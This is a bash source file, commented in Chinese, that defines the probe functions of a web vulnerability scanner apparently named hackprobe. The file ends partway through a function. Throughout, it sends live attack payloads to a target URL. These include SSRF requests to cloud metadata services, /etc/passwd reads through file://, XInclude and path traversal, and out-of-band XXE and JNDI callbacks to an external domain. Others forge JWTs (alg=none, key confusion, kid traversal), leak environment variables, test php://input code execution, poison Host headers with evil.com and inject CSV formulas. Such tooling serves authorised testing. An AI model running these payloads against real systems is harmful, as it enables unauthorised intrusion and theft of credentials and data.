#!/usr/bin/env bash
# tier2_signal.sh — Tier 2 信号驱动探针（38 个，条件触发）
#
# 用法：
#   source probes/tier2_signal.sh   # 注册函数（零副作用）
#   run_probes_tier2                # 执行
#
# 依赖：$TMP / $SHARED（由 infra/directory_setup.md 的 init_hackprobe_dir 导出）
#       /  record_hit()（由 probes/tier1_universal.sh 提供，本文件不重复定义）
#
# source 阶段零副作用：本文件只做定义与变量初始化，不发起任何网络请求。
# 每个探针函数自带条件检查，不满足立即 return 0。

# ====== 路径 fallback（正常流程由 init_hackprobe_dir 导出）======
if [ -z "${SHARED:-}" ] || [ -z "${TMP:-}" ]; then
  echo "[probes] WARN: \$SHARED/\$TMP 未定义 —— 请先 source infra/directory_setup.md 并调 init_hackprobe_dir" >&2
  WORK_DIR="${WORK_ROOT:-$(pwd)}"
  TMP="${TMP:-${WORK_DIR}/_work/tmp}"
  SHARED="${SHARED:-${WORK_DIR}/_work/shared}"
fi
mkdir -p "$TMP" "$SHARED"

# record_hit 由 tier1_universal.sh 提供。tier2 可能被单独 source，
# 这里只做存在性提示，不重新定义（避免两处实现漂移）。
if ! declare -f record_hit >/dev/null 2>&1; then
  echo "[probes] WARN: record_hit() 未定义 —— 请先 source probes/tier1_universal.sh（否则命中的探针无法记录）" >&2
fi

# HITS_FILE 初始化保持幂等（tier2 可能被单独 source）
HITS_FILE="$TMP/3_probe_hits.json"
[ -s "$HITS_FILE" ] || echo '{"hits":[]}' > "$HITS_FILE"


# ============================================================
# P13 — SSRF: 云 metadata（AWS / GCP / Azure / 阿里云）
# ============================================================
# Condition: params_all.txt 非空（有 URL 参数）
P13_SSRF_Metadata() {
  [ ! -s "$SHARED/params_all.txt" ] && echo "[SKIP] P13: no param URLs" && return 0

  local SSRF_TARGETS param endpoint cloud resp
  SSRF_TARGETS="http://169.254.169.254/latest/meta-data/|AWS
http://metadata.google.internal/computeMetadata/v1/|GCP
http://169.254.169.254/metadata/instance?api-version=2021-02-01|Azure
http://100.100.100.200/latest/meta-data/|Aliyun"
  for param in url next redirect dest target proxy uri path href link src data; do
    echo "$SSRF_TARGETS" | while IFS='|' read endpoint cloud; do
      resp=$(curl -sk --max-time 5 "${URL}?${param}=${endpoint}" 2>/dev/null | head -c 500)
      echo "$resp" | grep -qiE "ami-id|instance-id|metadata|local-hostname|computeMetadata|azEnvironment" && \
        record_hit "P13" "ssrf-server-side-request-forgery" "$cloud metadata via $param" && break 2
    done
  done
}

# ============================================================
# P14 — SSRF: 协议走私（file:// / gopher://）
# ============================================================
# Condition: 有 URL 参数
P14_SSRF_Protocols() {
  local param resp
  for param in url file path dest proxy; do
    resp=$(curl -sk --max-time 5 "${URL}?${param}=file:///etc/passwd" 2>/dev/null | head -c 200)
    echo "$resp" | grep -q "root:" && record_hit "P14" "ssrf-server-side-request-forgery" "file:// protocol via $param" && break
    resp=$(curl -sk --max-time 5 "${URL}?${param}=gopher://127.0.0.1:6379/_INFO" 2>/dev/null | head -c 200)
    echo "$resp" | grep -qiE "redis_version|redis" && record_hit "P14" "ssrf-server-side-request-forgery" "gopher:// protocol via $param" && break
  done
}

# ============================================================
# P15 — XXE: XML 实体注入
# ============================================================
# Condition: POST 端点存在（第一个接受 XML 的端点）
P15_XXE() {
  local url xml_status xxe_resp xinclude_resp
  for url in $(grep -iE '/api/' "$SHARED/urls_all.txt" 2>/dev/null | head -5); do
    # Check if endpoint accepts XML
    xml_status=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$url" \
      -H "Content-Type: application/xml" -d '<x/>' --max-time 5)
    [ "$xml_status" = "415" ] && continue

    # Phase 1: Inline entity (fastest check)
    xxe_resp=$(curl -sk -X POST "$url" -H "Content-Type: application/xml" \
      -d '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe "XXE-TEST">]><x>&xxe;</x>' --max-time 5)
    echo "$xxe_resp" | grep -q "XXE-TEST" && \
      record_hit "P15" "xxe-xml-external-entity" "XXE inline entity confirmed at $url" && break

    # Phase 2: OOB external entity (only if OAST available)
    if [ -n "$OAST_DOMAIN" ]; then
      curl -sk -X POST "$url" -H "Content-Type: application/xml" \
        -d "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://${OAST_DOMAIN}/xxe\">]><x>&xxe;</x>" \
        --max-time 5 -o /dev/null 2>/dev/null &
      echo "[P15] OOB XXE sent to ${OAST_DOMAIN} — check interactsh"
    fi

    # Phase 3: Parameter entity (blind XXE, bypasses inline filters)
    if [ -n "$OAST_DOMAIN" ]; then
      curl -sk -X POST "$url" -H "Content-Type: application/xml" \
        -d "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % dtd SYSTEM \"http://${OAST_DOMAIN}/xxe_param\">%dtd;]><x>&send;</x>" \
        --max-time 5 -o /dev/null 2>/dev/null &
    fi

    # Phase 4: XInclude (no DTD needed, bypasses DOCTYPE filters)
    xinclude_resp=$(curl -sk -X POST "$url" -H "Content-Type: application/xml" \
      -d '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>' --max-time 5)
    echo "$xinclude_resp" | grep -q "root:" && \
      record_hit "P15" "xxe-xml-external-entity" "XInclude /etc/passwd readable at $url"

    break  # Only test first XML-capable endpoint to save time
  done
}

# ============================================================
# P16 — NoSQL 注入
# ============================================================
# Condition: _shared/signals.json attack_surface.has_json_api = true
P16_NoSQL() {
  local url resp start elapsed
  for url in $(grep -iE '/api/' "$SHARED/urls_all.txt" 2>/dev/null | head -5); do
    # MongoDB $gt injection
    resp=$(curl -sk -X POST "$url" -H "Content-Type: application/json" \
      -d '{"username":{"$gt":""},"password":{"$gt":""}}' --max-time 5)
    echo "$resp" | grep -qiE "invalid|error|unauthorized|success" && \
      record_hit "P16" "nosql-injection" "NoSQL operator accepted at $url"

    # MongoDB $where injection (time-based)
    start=$(date +%s%3N)
    curl -sk -X POST "$url" -H "Content-Type: application/json" \
      -d '{"$where":"sleep(2000)"}' --max-time 5 -o /dev/null 2>/dev/null
    elapsed=$(( $(date +%s%3N) - start ))
    [ "$elapsed" -gt 2000 ] && record_hit "P16" "nosql-injection" "Time-based NoSQL: ${elapsed}ms at $url" && break
  done
}

# ============================================================
# P17 — Deserialization: Java
# ============================================================
# Condition: signals.json tech.language = "java" or server contains Tomcat/Jetty/WebLogic
P17_JavaDeser() {
  local JAVA_DESER_B64 url resp
  JAVA_DESER_B64=$(echo -ne '\xac\xed\x00\x05' | base64)  # Java serialization magic bytes
  for url in $(grep -iE '/api/' "$SHARED/urls_all.txt" 2>/dev/null | head -5) "${URL}"; do
    resp=$(curl -sk -X POST "$url" -H "Content-Type: application/x-java-serialized-object" \
      --data-binary "$(echo "$JAVA_DESER_B64" | base64 -d)" --max-time 5)
    echo "$resp" | grep -qiE "ClassNotFoundException|ObjectInputStream|java.io|deserializ" && \
      record_hit "P17" "deserialization-insecure" "Java deser endpoint: $url → $resp" && break
  done
}

# ============================================================
# P18 — Deserialization: PHP
# ============================================================
# Condition: signals.json tech.language = "php" or X-Powered-By: PHP
P18_PHPDeser() {
  local PHP_DESER url resp
  PHP_DESER='a:2:{i:0;s:4:"test";i:1;i:1337;}'
  for url in $(grep -iE '/api/' "$SHARED/urls_all.txt" 2>/dev/null | head -5) "${URL}"; do
    resp=$(curl -sk -X POST "$url" -d "data=${PHP_DESER}" --max-time 5)
    echo "$resp" | grep -qiE "unserialize|php var_dump|offset.*error|notice.*array" && \
      record_hit "P18" "deserialization-insecure" "PHP unserialize at $url" && break
  done
}

# ============================================================
# P19 — Deserialization: .NET ViewState
# ============================================================
# Condition: signals.json tech contains ASP.NET or IIS
P19_NetDeser() {
  local page
  page=$(curl -sk "$URL" --max-time 5)
  echo "$page" | grep -qi '__VIEWSTATE' && \
    record_hit "P19" "deserialization-insecure" ".NET ViewState detected"
}

# ============================================================
# P20 — JWT: 全攻击面（alg=none / 混淆 / kid 穿越 / jku）
# ============================================================
# Condition: jwt_tokens.txt has tokens
P20_JWT_None() {
  [ ! -s "$SHARED/jwt_tokens.txt" 2>/dev/null ] && { echo "[SKIP] P20: no JWT found"; return 0; }

  local JWT_HIT token header_raw payload_raw header_json payload_json
  local kid alg none_header none_token status hs_header conf_token
  local kid_header kid_token kid_sqli jku jku_header
  JWT_HIT=0
  head -5 "$SHARED/jwt_tokens.txt" | while read token; do
    # Parse header
    header_raw=$(echo "$token" | cut -d. -f1)
    payload_raw=$(echo "$token" | cut -d. -f2)
    header_json=$(echo "$header_raw" | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.dumps(json.load(sys.stdin)))" 2>/dev/null)
    payload_json=$(echo "$payload_raw" | base64 -d 2>/dev/null | python3 -c "import sys,json;print(json.dumps(json.load(sys.stdin)))" 2>/dev/null)
    kid=$(echo "$header_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('kid',''))" 2>/dev/null)
    alg=$(echo "$header_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('alg','HS256'))" 2>/dev/null)

    # === Attack 1: alg=none ===
    none_header=$(echo "$header_raw" | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);d['alg']='none';print(json.dumps(d))" 2>/dev/null | base64 -w0 2>/dev/null)
    if [ -n "$none_header" ]; then
      none_token="${none_header}.${payload_raw}."
      status=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $none_token" "$URL" --max-time 5)
      [ "$status" != "401" ] && [ "$status" != "403" ] && \
        record_hit "P20" "jwt-oauth-token-attacks" "JWT alg=none accepted → $status" && JWT_HIT=1 && break
    fi

    # === Attack 2: HMAC/RSA confusion (if alg is RS256, try HS256 with public key as secret) ===
    if echo "$alg" | grep -qi "RS\|ES\|PS"; then
      # Create HS256 header
      hs_header=$(echo "$header_raw" | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);d['alg']='HS256';print(json.dumps(d))" 2>/dev/null | base64 -w0 2>/dev/null)
      if [ -n "$hs_header" ]; then
        conf_token="${hs_header}.${payload_raw}."
        # Try with empty secret (common implementation bug)
        status=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $conf_token" "$URL" --max-time 5)
        [ "$status" != "401" ] && [ "$status" != "403" ] && \
          record_hit "P20" "jwt-oauth-token-attacks" "JWT RS256→HS256 confusion (empty secret) accepted → $status" && JWT_HIT=1 && break
      fi
    fi

    # === Attack 3: kid path traversal (read /dev/null → deterministic signature) ===
    if [ -n "$kid" ] && [ "$kid" != "null" ]; then
      kid_header=$(echo "$header_raw" | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);d['kid']='../../../../../../dev/null';print(json.dumps(d))" 2>/dev/null | base64 -w0 2>/dev/null)
      if [ -n "$kid_header" ]; then
        kid_token="${kid_header}.${payload_raw}."
        status=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $kid_token" "$URL" --max-time 5)
        [ "$status" != "401" ] && [ "$status" != "403" ] && \
          record_hit "P20" "jwt-oauth-token-attacks" "JWT kid path traversal → /dev/null accepted → $status" && JWT_HIT=1 && break

        # Also try kid path traversal for SQLi (if kid looks like a DB key)
        kid_sqli=$(echo "$header_raw" | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);d['kid']=\"x' OR 1=1--\";print(json.dumps(d))" 2>/dev/null | base64 -w0 2>/dev/null)
        [ -n "$kid_sqli" ] && curl -sk -o /dev/null -H "Authorization: Bearer ${kid_sqli}.${payload_raw}." "$URL" --max-time 5 2>/dev/null
      fi
    fi

    # === Attack 4: jku injection (if header has jku, try pointing to attacker JWKS) ===
    jku=$(echo "$header_json" | python3 -c "import sys,json;print(json.load(sys.stdin).get('jku',''))" 2>/dev/null)
    if [ -n "$jku" ] && [ "$jku" != "null" ] && [ -n "$OAST_DOMAIN" ]; then
      jku_header=$(echo "$header_raw" | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);d['jku']='https://${OAST_DOMAIN}/jwks.json';print(json.dumps(d))" 2>/dev/null | base64 -w0 2>/dev/null)
      [ -n "$jku_header" ] && curl -sk -o /dev/null -H "Authorization: Bearer ${jku_header}.${payload_raw}." "$URL" --max-time 5 2>/dev/null
      echo "[P20] jku injection probe sent — check ${OAST_DOMAIN} for callback"
    fi
  done

  [ "$JWT_HIT" = "1" ] && return 0
  return 0
}

# ============================================================
# P21 — JWT: 弱密钥
# ============================================================
# Condition: jwt_tokens.txt has tokens
P21_JWT_Weak() {
  local token secret
  # Test top-10 weak secrets
  [ ! -s "$SHARED/jwt_tokens.txt" 2>/dev/null ] && return 0
  head -3 "$SHARED/jwt_tokens.txt" | while read token; do
    for secret in secret password 123456 admin key jwt_secret secret_key private_key test; do
      jwt_tool "$token" -C -p "$secret" 2>/dev/null | grep -q "SIGNATURE VERIFIED" && \
        record_hit "P21" "jwt-oauth-token-attacks" "JWT cracked with secret=$secret" && break 2
    done
  done
}

# ============================================================
# P22 — Type Juggling: PHP 弱比较
# ============================================================
# Condition: signals.json tech.language = "php"
P22_TypeJuggling() {
  local login_url resp
  [ -z "$(grep -i login "$SHARED/urls_all.txt" 2>/dev/null | head -1)" ] && return 0

  login_url=$(grep -i login "$SHARED/urls_all.txt" 2>/dev/null | head -1)
  resp=$(curl -sk -X POST "$login_url" -H "Content-Type: application/json" \
    -d '{"user":"admin","password":true}' --max-time 5)
  echo "$resp" | grep -qiE "welcome|dashboard|logged.?in|session|authenticated" && \
    record_hit "P22" "type-juggling" "Type juggling bypass: password=true → authenticated"
}

# ============================================================
# P23 — Prototype Pollution
# ============================================================
# Condition: signals.json attack_surface.has_json_api = true
P23_PrototypePollution() {
  local url resp
  for url in $(grep -iE '/api/' "$SHARED/urls_all.txt" 2>/dev/null | head -3); do
    resp=$(curl -sk -X POST "$url" -H "Content-Type: application/json" \
      -d '{"__proto__":{"polluted":"hackprobe_test"},"constructor":{"prototype":{"polluted":"hackprobe_test"}}}' --max-time 5)
    [ -n "$resp" ] && record_hit "P23" "prototype-pollution" "Proto pollution probe sent to $url"
  done
}

# ============================================================
# P24 — EL Injection: SpEL / OGNL
# ============================================================
# Condition: signals.json tech.language = "java"
P24_ELInjection() {
  local param resp
  for param in q search id name value; do
    resp=$(curl -sk "${URL}?${param}=\${7*7}" --max-time 5)
    echo "$resp" | grep -q "49" && \
      record_hit "P24" "expression-language-injection" "EL injection via $param: 7*7=49 reflected" && break
    resp=$(curl -sk "${URL}?${param}=%23{7*7}" --max-time 5)
    echo "$resp" | grep -q "49" && \
      record_hit "P24" "expression-language-injection" "SpEL injection via $param" && break
  done
}

# ============================================================
# P25 — JNDI 注入
# ============================================================
# Condition: signals.json tech.language = "java" + OAST available
P25_JNDI() {
  local param
  [ -z "$OAST_DOMAIN" ] && echo "[SKIP] P25: no OAST domain" && return 0

  for param in q search id name value url href; do
    curl -sk "${URL}?${param}=\${jndi:ldap://hackprobe.${OAST_DOMAIN}/test}" --max-time 5 -o /dev/null
  done
  echo "[INFO] P25: JNDI probes sent — check OAST for callbacks"
}

# ============================================================
# P26 — LFI: 路径穿越 + PHP 封装链 + /proc
# ============================================================
# Condition: 始终调用（内部按 PHP 栈分支），无参数则快速返回
P26_LFI() {
  local param resp decoded input_code log_path
  # Phase 1: Direct path traversal (/etc/passwd, /etc/hosts, C:\windows\win.ini)
  for param in file path page template include doc view load; do
    # Unix
    resp=$(curl -sk "${URL}?${param}=../../../../../../etc/passwd" --max-time 5 | head -c 300)
    echo "$resp" | grep -q "root:" && \
      record_hit "P26" "path-traversal-lfi" "LFI /etc/passwd via $param" && return 0
    # Windows
    resp=$(curl -sk "${URL}?${param}=../../../../../../windows/win.ini" --max-time 5 | head -c 300)
    echo "$resp" | grep -qiE "\[fonts\]|\[extensions\]" && \
      record_hit "P26" "path-traversal-lfi" "LFI windows/win.ini via $param" && return 0
  done

  # Phase 2: PHP wrapper chain (if PHP backend)
  local signals_json="${SIGNALS:-}"
  [ -z "$signals_json" ] && [ -s "$SHARED/signals.json" ] && signals_json=$(cat "$SHARED/signals.json" 2>/dev/null)
  if echo "$signals_json" | grep -qi "php" || echo "${SERVER_HEADER:-}" | grep -qi "php"; then
    for param in file path page; do
      # 2a: filter wrapper (most common bypass)
      resp=$(curl -sk "${URL}?${param}=php://filter/convert.base64-encode/resource=index" --max-time 5)
      if echo "$resp" | grep -qE '^[A-Za-z0-9+/=]{50,}$'; then
        record_hit "P26" "path-traversal-lfi" "PHP filter wrapper via $param → base64 output"
        # Try to decode and look for source code
        decoded=$(echo "$resp" | base64 -d 2>/dev/null | head -c 200)
        echo "$decoded" | grep -qiE '<?php|define\(|DB_' && \
          record_hit "P26" "path-traversal-lfi" "PHP source code exposed via filter wrapper → $param"
        break
      fi

      # 2b: rot13 filter (bypass some WAF)
      resp=$(curl -sk "${URL}?${param}=php://filter/string.rot13/resource=index" --max-time 5 | head -c 300)
      [ ${#resp} -gt 50 ] && ! echo "$resp" | grep -qiE "<html|<body|<script" && \
        record_hit "P26" "path-traversal-lfi" "PHP rot13 filter via $param → ${#resp} bytes"

      # 2c: iconv chain (utf8→utf16 → utf-7 bypass)
      resp=$(curl -sk "${URL}?${param}=php://filter/convert.iconv.utf-8.utf-16/resource=index" --max-time 5 | head -c 100)
      [ ${#resp} -gt 30 ] && \
        record_hit "P26" "path-traversal-lfi" "PHP convert.iconv via $param → ${#resp} bytes" && break

      # 2d: php://input (POST body as code — potential RCE)
      input_code=$(curl -sk -X POST "${URL}?${param}=php://input" -d '<?php echo "PHPINPUTOK";' --max-time 5)
      echo "$input_code" | grep -q "PHPINPUTOK" && \
        record_hit "P26" "path-traversal-lfi" "php://input RCE via $param" && break
    done

    # Phase 3: /proc/self/environ (environment variables leak)
    for param in file path page include; do
      resp=$(curl -sk "${URL}?${param}=../../../../../../proc/self/environ" --max-time 5 | head -c 500 2>/dev/null)
      # environ is null-delimited; check for HTTP_ or PATH=
      if echo "$resp" | grep -qE 'HTTP_HOST|PATH=|USER=|HOME='; then
        record_hit "P26" "path-traversal-lfi" "/proc/self/environ readable via $param — env vars exposed"
        break
      fi
    done

    # Phase 4: Log injection paths (LFI→RCE chain hints)
    for log_path in "/proc/self/fd/0" "/proc/self/fd/1" "/var/log/nginx/access.log" \
                    "/var/log/apache2/access.log" "/var/log/httpd/access_log" \
                    "/var/log/apache/error.log"; do
      resp=$(curl -sk "${URL}?${param}=../../../../../..${log_path}" --max-time 5 | head -c 200 2>/dev/null)
      # Check for log-like content (IP addresses, timestamps, HTTP methods)
      if echo "$resp" | grep -qE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+.*GET|POST'; then
        record_hit "P26" "path-traversal-lfi" "Log file accessible: $log_path — LFI→RCE possible via log injection"
        break
      fi
    done
  fi
}

# ============================================================
# P27 — 文件上传: 端点检测
# ============================================================
# Condition: upload_surface.json 或 /upload/ 路径
P27_UploadDetect() {
  local path status
  # Upload endpoint detection (read-only OPTIONS probe, no file sent)
  for path in /upload /api/upload /api/v1/upload /file/upload /api/files \
              /admin/upload /api/import /api/v1/import /_upload /uploader \
              /kindeditor/upload /ueditor/upload /ckfinder/upload /api/attachment/upload \
              /api/avatar/upload /api/image/upload /api/media/upload \
              /api/csv/import /api/excel/import /api/backup/restore; do
    status=$(curl -sk -o /dev/null -w "%{http_code}" "${URL}${path}" --max-time 4)
    [[ "$status" =~ ^(200|301|302|401|403|405|500)$ ]] && \
      record_hit "P27" "upload-insecure-files" "Upload endpoint: ${URL}${path} → $status" && break
  done
}

# ============================================================
# P28 — GraphQL: 端点探测
# ============================================================
# Condition: 有 /graphql 端点
P28_GraphQL() {
  local gql_ep resp
  for gql_ep in /graphql /api/graphql /query /v1/graphql /gql /graphiql /__graphql /graphql/v1; do
    resp=$(curl -sk -X POST "${URL}${gql_ep}" -H "Content-Type: application/json" \
      -d '{"query":"{__typename}"}' --max-time 5)
    echo "$resp" | grep -qE "__typename|errors|data" && \
      record_hit "P28" "graphql-and-hidden-parameters" "GraphQL: ${URL}${gql_ep}" && break
  done
}

# ============================================================
# P29 — Subdomain Takeover
# ============================================================
# Condition: 子域名列表中有指向云服务的 CNAME
P29_SubdomainTakeover() {
  local sub cname pattern
  for sub in $(head -20 "$SHARED/subs_all.txt" 2>/dev/null); do
    cname=$(dig +short "$sub" CNAME 2>/dev/null | head -1)
    [ -z "$cname" ] && continue

    # Check common takeover targets
    for pattern in "cloudfront.net" "herokuapp.com" "azurewebsites.net" \
                  "azureedge.net" "s3.amazonaws.com" "fastly.net" \
                  "github.io" "surge.sh" "netlify.app" "firebaseapp.com" \
                  "myshopify.com" "bitbucket.io" "readme.io" \
                  "cargocollective.com" "unicornplatform.com"; do
      echo "$cname" | grep -qi "$pattern" && \
        record_hit "P29" "subdomain-takeover" "$sub → $cname ($pattern)" && break
    done
  done
}

# ============================================================
# P30 — 密码重置绕过
# ============================================================
# Condition: attack_surface.has_login = true
P30_PasswordReset() {
  local reset_url status
  for reset_url in $(grep -iE '/(reset|forgot|recover|password)' "$SHARED/urls_all.txt" 2>/dev/null | head -3); do
    # Host header poisoning
    status=$(curl -sk -o /dev/null -w "%{http_code}" -H "Host: evil.com" "$reset_url" --max-time 5)
    [ "$status" = "200" ] && record_hit "P30" "authbypass-authentication-flaws" "Host header accepted at $reset_url"
    # Check if email param is in GET (insecure token delivery)
    echo "$reset_url" | grep -qi 'email=' && \
      record_hit "P30" "authbypass-authentication-flaws" "Email in GET param at $reset_url"
  done
}

# ============================================================
# P33 — Business Logic: 价格/角色参数篡改
# ============================================================
# Condition: attack_surface.has_payment = true
P33_BizLogic() {
  local url resp
  for url in $(grep -iE '/(price|amount|total|role|permission|plan|subscription|tier)' "$SHARED/urls_all.txt" 2>/dev/null | head -5); do
    resp=$(curl -sk "$url" -d "price=0.01&total=0.01&role=admin&plan=enterprise" --max-time 5 | head -c 200)
    echo "$resp" | grep -qiE "0\.01|admin|enterprise" && \
      record_hit "P33" "business-logic-vulnerabilities" "Param tampering accepted at $url"
  done
}

# ============================================================
# P34 — API: 隐藏参数爆破
# ============================================================
# Condition: attack_surface.has_json_api = true
# 注：URL 经 sys.argv 传给 Python，避免含中文/引号的路径或参数破坏源码
P34_HiddenParams() {
  local api_url
  for api_url in $(grep -iE '/api/' "$SHARED/urls_all.txt" 2>/dev/null | head -3); do
    # hidden param discovery
    python3 -c '
import urllib.request, json, sys
api_url = sys.argv[1]
try:
    req = urllib.request.Request(api_url,
        data=json.dumps({"__proto__": {}, "admin": True, "debug": True}).encode(),
        headers={"Content-Type": "application/json"})
    resp = urllib.request.urlopen(req, timeout=5)
    body = resp.read().decode("utf-8", "replace")[:200]
    if any(w in body.lower() for w in ["true", "admin", "debug", "success"]):
        print("P34 HIT: hidden params accepted at " + api_url)
        print(body)
except Exception as e:
    print("P34: error: " + str(e))
' "$api_url" 2>/dev/null | grep -q "P34 HIT" && \
      record_hit "P34" "api-authorization-and-bola" "Hidden param accepted at $api_url"
  done
}

# ============================================================
# P35 — Host Header 攻击
# ============================================================
# Condition: 非静态站
P35_HostHeader() {
  local header resp
  for header in "X-Forwarded-Host: evil.com" "Host: evil.com" "X-Forwarded-Server: evil.com"; do
    resp=$(curl -sk -H "$header" "$URL" --max-time 5 | head -c 500)
    echo "$resp" | grep -qi "evil.com" && \
      record_hit "P35" "http-host-header-attacks" "Host header reflected: $header" && break
  done
}

# ============================================================
# P36 — Web Cache Deception（缓存头侦察）
# ============================================================
# Condition: 有缓存头
P36_CacheDeception() {
  local headers
  headers=$(curl -sk -I "$URL" --max-time 5)
  echo "$headers" | grep -qiE "x-cache|cf-cache-status|etag|last-modified" && \
    record_hit "P36" "web-cache-deception" "Cache headers present — cache deception possible"
}

# ============================================================
# P37 — CSP Bypass 基础分析
# ============================================================
# Condition: CSP header 存在
P37_CSP_Bypass() {
  local csp
  csp=$(curl -sk -I "$URL" --max-time 5 | grep -i "content-security-policy" | tr -d '\r')
  [ -n "$csp" ] && echo "$csp" | grep -qiE "unsafe-inline|unsafe-eval|data:|blob:|\*" && \
    record_hit "P37" "csp-bypass-advanced" "Weak CSP: $csp"
}

# ============================================================
# P38 — Clickjacking
# ============================================================
# Condition: 非静态站
P38_Clickjacking() {
  local frame_opts csp
  frame_opts=$(curl -sk -I "$URL" --max-time 5 | grep -iE "x-frame-options|frame-ancestors" | tr -d '\r')
  [ -z "$frame_opts" ] && \
    record_hit "P38" "clickjacking" "No X-Frame-Options or CSP frame-ancestors — site is frameable"
  # Check if frame-ancestors in CSP
  csp=$(curl -sk -I "$URL" --max-time 5 | grep -i "content-security-policy" | tr -d '\r')
  [ -n "$csp" ] && ! echo "$csp" | grep -qi "frame-ancestors" && \
    record_hit "P38" "clickjacking" "CSP present but no frame-ancestors directive"
}

# ============================================================
# P39 — CSV Formula Injection
# ============================================================
# Condition: URL contains csv/excel/export/download
P39_CSVFormula() {
  local url csv_resp inject_url
  for url in $(grep -iE '/(csv|excel|export|download\.(csv|xls|xlsx))' "$SHARED/urls_all.txt" 2>/dev/null | head -5); do
    # Probe with DDE and formula payloads
    csv_resp=$(curl -sk "$url" --max-time 5 | head -c 500)
    # Check if response looks like CSV (comma-separated, not HTML)
    if echo "$csv_resp" | grep -qE '^[^<]+,.*[^>]$'; then
      record_hit "P39" "csv-formula-injection" "CSV exported at $url — potential formula injection"
      break
    fi
  done
  # Also test if we can inject into export params
  for url in $(grep -iE '/export|/download' "$SHARED/urls_all.txt" 2>/dev/null | head -3); do
    inject_url=$(echo "$url" | sed 's/=\([^&]*\)/=%3Dcmd%7C%27%2FC+calc%27%21A0/')
    curl -sk "$inject_url" --max-time 5 -o /dev/null
    record_hit "P39" "csv-formula-injection" "Formula injection probe sent to $inject_url"
  done
}

# ============================================================
# P40 — Dangling Markup Injection
# ============================================================
# Condition: 页面有反射参数
P40_DanglingMarkup() {
  local param resp
  # Check if we can inject HTML without script — e.g., <img src="evil.com/steal?
  for param in q search s name value; do
    resp=$(curl -sk "${URL}?${param}=%3Cimg%20src%3D%27https%3A%2F%2Fevil.com%2Fsteal%3F" --max-time 5)
    # If the <img tag is retained (not stripped) but script is stripped — dangling markup
    echo "$resp" | grep -qi "<img src='https" && \
      record_hit "P40" "dangling-markup-injection" "HTML injection without JS via $param — dangling markup possible" && break
  done
}

# ============================================================
# P41 — DNS Rebinding
# ============================================================
# Condition: open ports include internal services (DB, Redis, etc.)
P41_DNSRebinding() {
  local target_ip
  if grep -qiE '3306|5432|6379|27017|9200|11211' "$SHARED/ports.json" 2>/dev/null; then
    # Check if target resolves to a single static IP (rebinding needs time-based rotation)
    target_ip=$(dig +short "$HOST" A 2>/dev/null | head -1)
    [ -n "$target_ip" ] && \
      record_hit "P41" "dns-rebinding-attacks" "Internal services on $target_ip — DNS rebinding target candidate"
  fi
}

# ============================================================
# P42 — Email Header Injection
# ============================================================
# Condition: URL contains contact/feedback/message/send-mail
P42_EmailHeader() {
  local url resp
  for url in $(grep -iE '/(contact|feedback|message|send.?mail|inquiry|support)' "$SHARED/urls_all.txt" 2>/dev/null | head -3); do
    # Test SMTP header injection via email field
    resp=$(curl -sk -X POST "$url" \
      -d "email=test@test.com%0ABcc:security@evil.com&message=test" --max-time 5 -o /dev/null -w "%{http_code}")
    [ "$resp" = "200" ] && record_hit "P42" "email-header-injection" "Email injection probe at $url → $resp"
  done
}

# ============================================================
# P43 — HTTP/2 探测
# ============================================================
# Condition: HTTPS
P43_HTTP2() {
  local alpn h2_resp
  # Check if server supports HTTP/2 (h2)
  alpn=$(openssl s_client -alpn h2 -connect "$HOST:443" </dev/null 2>&1 | grep -i "ALPN protocol")
  echo "$alpn" | grep -q "h2" && \
    record_hit "P43" "http2-specific-attacks" "HTTP/2 supported — H2 smuggling potential"
  # Also check via curl
  h2_resp=$(curl -sk --http2 -I "$URL" --max-time 5 2>&1)
  echo "$h2_resp" | grep -qi "HTTP/2" && \
    record_hit "P43" "http2-specific-attacks" "HTTP/2 confirmed via curl response"
}

# ============================================================
# P44 — WebSocket
# ============================================================
# Condition: 页面源码含 ws:// 或 wss://
P44_WebSocket() {
  local page ws_urls ws ws_host ws_port ws_resp
  page=$(curl -sk "$URL" --max-time 5)
  ws_urls=$(echo "$page" | grep -oE 'wss?://[^"'\''<> ]+' | head -5)
  for ws in $ws_urls; do
    # Test if WebSocket upgrade is accepted
    ws_host=$(echo "$ws" | sed 's|wss\?://||' | cut -d/ -f1 | cut -d: -f1)
    ws_port=$(echo "$ws" | grep -oE ':([0-9]+)' | tr -d ':' || echo "443")
    ws_resp=$(curl -sk -I -H "Upgrade: websocket" -H "Connection: Upgrade" "https://${ws_host}:${ws_port}" --max-time 5 2>&1)
    echo "$ws_resp" | grep -q "101" && \
      record_hit "P44" "websocket-security" "WebSocket upgrade accepted at $ws → 101"
  done
}

# ============================================================
# P45 — Email Spoofing: SPF/DMARC Gap
# ============================================================
# Condition: Wave 1 domain intelligence already checked SPF/DMARC/DKIM
P45_EmailSpoofing() {
  local spf dmarc dkim_any
  spf=$(dig "$HOST" TXT +short 2>/dev/null | grep "v=spf1" || echo "")
  dmarc=$(dig "_dmarc.$HOST" TXT +short 2>/dev/null | grep "v=DMARC" || echo "")
  dkim_any=$(dig "default._domainkey.$HOST" TXT +short 2>/dev/null | grep "v=DKIM" || echo "")

  if [ -z "$spf" ] || [ -z "$dmarc" ]; then
    record_hit "P45" "email-header-injection" "Email spoofing: SPF=$(if [ -n "$spf" ]; then echo 'yes'; else echo 'NO'; fi) DMARC=$(if [ -n "$dmarc" ]; then echo 'yes'; else echo 'NO'; fi)"
  fi
  if [ -n "$dmarc" ] && echo "$dmarc" | grep -q "p=none"; then
